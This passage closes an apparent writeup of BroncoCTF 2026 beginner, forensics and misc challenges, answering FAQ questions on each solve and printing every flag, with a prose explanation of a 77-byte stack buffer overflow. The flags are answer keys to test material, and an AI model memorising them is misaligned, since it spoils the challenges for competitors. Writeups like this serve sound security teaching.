Naive line-by-line diff finds 79 differences, but the flag body only has 28 payload positions. The problem is that `file2` has one more line than `file1`, and the insertion at `f2[347]` misaligns every position past 347 in a `zip(f1, f2)` walk. Fix: score every candidate insertion index by the number of exact matches it produces when the corresponding position is dropped from the longer file. The maximum (272 matches) occurs at index 347, dropping character `V`. With that offset applied, real diffs collapse from 79 to 28. Split those 28 into case-only flips (Baconian-cipher decoy, decodes to garbage) versus actual letter changes (payload, 28 positions), and read `file2`'s character at each payload position in order: `bronco{y@yyy_Y0u_f0und_m3!!}`.

### Why does the Zip Zip Hooray 7z password hint actually work?

7z supports two encryption modes. Content-only encryption (`-p<pw>` alone) encrypts file contents with AES-256 but leaves the archive header (including the filename table) plaintext, so `7z l archive.7z` will list every entry's name and size without a password prompt. Full header encryption (`-p<pw> -mhe=on`) encrypts the header too, and `7z l` prompts for the password. The challenge author picked mode #1. That's the only reason "password is the first filename inside" is a *usable* hint: you can read the filename with `7z l` before decrypting, then use it as the `-p` argument. If they'd flipped on `-mhe=on`, the hint would be a paradox.

### How many total layers are in the Zip Zip Hooray archive stack?

1,251 layers. The stack cycles five compression formats (`gzip → tar → bzip2 → 7z → zip`) with each cycle bumping an inner filename counter by 4 (`layer1.tar → layer4.zip → layer5.tar.gz → layer8.zip → ...`). 250 iterations of the cycle × 5 layers per cycle = 1,250 archive layers, plus 1 text leaf = 1,251. The naming supports the "250-iteration for-loop" theory: the last 7z contained `layer1000.zip`, i.e. exactly `250 × 4 = 1000` steps of the `layer_N += 4` counter. Runtime for the bash `while` loop dispatching on `file(1)` output: ~3 minutes end-to-end.

### What's the broader lesson from the BroncoCTF 2026 beginner + forensics + misc tracks?

Trained triage. `exiftool` for images. `file(1)` for extensionless or mis-extensioned files. `wc -l` before `diff`. Payload-size sweep for silent services. PNG chunk walk before touching pixels. Count distinct symbols and group length before reading a file as text. These are all one-command reflexes that either end the challenge in seconds or narrow the attack surface to something the next command can handle. The theme across all six challenges is that the artefact *tells you what to do* if you use the right tool to look at it, and the difficulty is only in remembering to reach for that tool first before committing to a hypothesis about what the file is.

### Where can I find the solver scripts?

Per-challenge READMEs, handouts, and solver scripts are at [Abdelkad3r/BroncoCTF-2026](https://github.com/Abdelkad3r/BroncoCTF-2026). Each challenge has a `solve.py` or `solve.sh` that reproduces the flag against a fresh instance (Pwntorial) or from the handout artefacts (everything else). All solvers use only Python standard library plus one or two system tools: `7z` for Zip Zip Hooray, standard `zlib` + `struct` for Bundle 99, no dependencies at all for the beginner challenges. Session transcripts under `artifacts/session.log` in each challenge directory.

## Closing notes

Six warmup challenges pulled together by one lesson: **the right one-command triage step is the difference between a five-minute solve and a five-hour rabbit hole**. `exiftool`, `file(1)`, `wc -l`, `xxd | head`, payload-size sweep, PNG chunk walk: all of them are two-word invocations that reveal a layer the default view (text editor, image viewer, extension) doesn't. Trained beginner-level triage is exactly the muscle this track is testing.

For adjacent event content on the same site, the [BroncoCTF 2026 pwn + reverse writeup](/ctf-writeups/broncoctf-2026-pwn-reverse-writeup/) covers the harder native side (seccomp-restricted ORW shellcode, four-gate gets() chain with stack-aligned ret2win, Roblox server-side Lua sandbox with write-over-read-protection, ARM64 dog simulator with FNV-1a Z3 preimage) and the [BroncoCTF 2026 web + crypto writeup](/ctf-writeups/broncoctf-2026-web-crypto-writeup/) covers the same event's web + crypto side (SQLite LIKE injection around a naive keyword stripper, `robots.txt` base64 leak, client-side auth trust, CSS-only blur bypass, MD5 collision dispatcher, 64-char keystring OTP). The [Junior.Crypt 2026 forensic + misc + OSINT writeup](/ctf-writeups/junior-crypt-2026-forensic-misc-osint-writeup/) covers a comparable pickle supply-chain backdoor, SVG clip-path ghost text, DOCX customXml revision replay, and MIDI pitch-wheel steganography. The [NoHackNoCTF 2026 master writeup](/ctf-writeups/nohacknoctf-2026-writeup/) covers AES-CTR nonce reuse and Redis SSTI. Full [CTF writeups index](/ctf-writeups/) for the rest.

<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is BroncoCTF 2026?","acceptedAnswer": {"@type": "Answer","text": "BroncoCTF is a jeopardy-style Capture-The-Flag competition run by Santa Clara University's Cyber Security Club (the 'Broncos'). The 2026 edition ran beginner, crypto, forensics, misc, pwn, reverse, and web categories, with challenges from 10 points up to a few hundred points. Flag format bronco{...}. This writeup covers three beginner challenges (Digital Crumbs, No Laughing Matter, Pwntorial), one forensics challenge (Bundle 99), and two misc challenges (Spot The Difference, Zip Zip Hooray). Paired pwn + reverse and web + crypto writeups on the same site. Per-challenge READMEs and solvers at github.com/Abdelkad3r/BroncoCTF-2026."}},
    {"@type": "Question","name": "How do you solve Digital Crumbs OSINT without GPS EXIF?","acceptedAnswer": {"@type": "Answer","text": "exiftool shows no GPS, no camera fingerprint. Rank visible clues by uniqueness: awning tagline 'Oakland's Oldest Coffee House' is specific enough to pin the address in one search (with 'The Coffee Mill' from the A-frame sign): 3363 Grand Ave, Oakland CA. US even/odd street numbering places the pizza shop across the street in the 3360s range: Domino's Pizza at 3360 Grand Ave. Flag: bronco{3360}."}},
    {"@type": "Question","name": "How is the No Laughing Matter file encoded?","acceptedAnswer": {"@type": "Answer","text": "File uses exactly two symbols (A and H) in 36 fixed 8-character groups. Two symbols in fixed 8-char groups is unambiguously binary. Try A=0, H=1 alphabetical mapping first and decode just the first group: AHHAAAHA = 01100010 = 0x62 = 'b'. Matches the bronco{...} prefix so the mapping is confirmed without decoding the whole file. Full decode: bronco{UFUNNYLMAOLOLXDIJBOLROFLHAHA}, a wall of chat-shorthand laughter reactions."}},
    {"@type": "Question","name": "Why does Pwntorial's exploit work at exactly 77 bytes?","acceptedAnswer": {"@type": "Answer","text": "Payload-size sweep shows a one-byte cliff at 76 (closed) to 77 (open). Reconstructed C: 76-byte stack buffer immediately followed by a zero-initialised gate variable, filled by a read without bounds check. 76 A's fill the buffer and land the trailing NUL on gate[0]. 77 A's spill 'A' = 0x41 into gate[0], making gate nonzero. Payloads 77-378 all work; 379+ clobbers the return address and suppresses the flag print."}},
    {"@type": "Question","name": "What are the six layers inside the Bundle 99 forensics artefact?","acceptedAnswer": {"@type": "Answer","text": "Six layers, each a known standard: (1) Bundle_99 is a zip with mimetype application/x-krita-resourcebundle; (2) inside sits paintoppresets/Brush 99.kpp, itself a PNG; (3) the PNG has a zTXt chunk labelled 'preset'; (4) inflating yields ~16 KB of XML; (5) a <param name='brush'> wraps another XML fragment in CDATA; (6) that fragment has <Brush type='kis_text_brush' text='bronco{1m4n4rt15ttru5t}'/>. kis_text_brush is Krita's 'type text and paint it as a stroke' tool."}},
    {"@type": "Question","name": "How does the Spot The Difference insertion index scoring work?","acceptedAnswer": {"@type": "Answer","text": "file2 has one more line than file1; the insertion at f2[347] misaligns a zip(f1, f2) walk. Score every candidate insertion index by exact-match count when the corresponding position is dropped from the longer file. Max (272 matches) at index 347 dropping character V. Real diffs collapse from 79 to 28. Split into case-only flips (Baconian decoy, garbage) vs. letter changes (payload). Read file2's char at each payload position: bronco{y@yyy_Y0u_f0und_m3!!}."}},
    {"@type": "Question","name": "Why does the Zip Zip Hooray 7z password hint actually work?","acceptedAnswer": {"@type": "Answer","text": "7z supports two encryption modes. Content-only (-p<pw> alone) encrypts contents with AES-256 but leaves the archive header (including filenames) plaintext, so 7z l lists entries without a prompt. Full header encryption (-p<pw> -mhe=on) encrypts the header too. The challenge author picked mode 1, so 'password is the first filename' is usable: 7z l reveals it before decryption. If they had used -mhe=on the hint would be a paradox."}},
    {"@type": "Question","name": "How many total layers are in the Zip Zip Hooray archive stack?","acceptedAnswer": {"@type": "Answer","text": "1,251 layers. Cycles gzip → tar → bzip2 → 7z → zip (5 formats per cycle) × 250 iterations = 1,250 archive layers plus 1 text leaf. Inner filename counter jumps by 4 per cycle (layer1.tar → layer4.zip → layer5.tar.gz → layer8.zip → ...). The last 7z contained layer1000.zip, confirming 250 × 4 = 1000 counter steps. Runtime end-to-end: ~3 minutes."}},
    {"@type": "Question","name": "What's the broader lesson from the BroncoCTF 2026 beginner + forensics + misc tracks?","acceptedAnswer": {"@type": "Answer","text": "Trained triage. exiftool for images. file(1) for extensionless files. wc -l before diff. Payload-size sweep for silent services. PNG chunk walk before pixels. Count distinct symbols and group length before reading a file as text. All one-command reflexes that either end the challenge in seconds or narrow the attack surface to something the next command can handle."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solver scripts at github.com/Abdelkad3r/BroncoCTF-2026. Each challenge has a solve.py or solve.sh reproducing the flag from a fresh instance (Pwntorial) or handout (everything else). All solvers use only Python stdlib plus one or two system tools: 7z for Zip Zip Hooray, zlib + struct for Bundle 99, no dependencies for the beginner challenges."}}
  ]
}
</script>
